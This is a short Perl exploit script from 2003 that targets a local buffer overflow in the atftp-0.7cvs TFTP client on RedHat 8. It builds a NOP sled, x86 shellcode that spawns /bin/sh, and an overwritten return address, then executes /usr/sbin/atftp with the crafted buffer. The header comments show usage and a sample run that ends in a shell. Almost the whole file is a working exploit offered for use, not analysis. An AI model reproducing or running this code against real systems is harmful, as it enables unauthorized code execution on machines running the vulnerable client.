#!/usr/bin/perl
# Date : 6 June 2003
#
# expl-atftp.pl : Local buffer overflow exploit for
#                 atftp-0.7cvs (client)
#
# Exploit tested on RedHat 8
#
# [jlanthea@localhost ]$ perl expl-atftp.pl
# Atftp local exploit by jlanthea - 2003
# The new return address: 0xbffffb20
# Usage: option <option name> [option value]
#       option disable <option name>
# sh-2.05b$
#
# Author : Julien LANTHEA
# Mail   : jlanthea@jlanthea.net
# www    : jlanthea.net
#
# Syntax :
#    perl expl-atftp.pl <offset> # works for me with -50

$vuln="/usr/sbin/atftp";

$shellcode =
        "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89\x46\x0c\x89\x76\x08\xb0".
        "\x0b\x87\xf3\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29\xc0\x40\xcd".
        "\x80\xe8\xde\xff\xff\xff/bin/sh";

$offset = "0";

if(@ARGV == 1) { $offset = $ARGV[0]; }
$nop     = "\x90";
$esp     = 0xbffffb20;

for ($i = 0; $i < (273 - (length($shellcode)) - 4); $i++) {
    $buffer .= "$nop";
    }

$buffer .= $shellcode;
$buffer .= pack('l', ($esp + $offset));

print("Atftp local exploit by jlanthea - 2003\n");
print("New return address: 0x",sprintf('%lx',($esp + $offset)),"\n");
exec("$vuln -t '$buffer'");

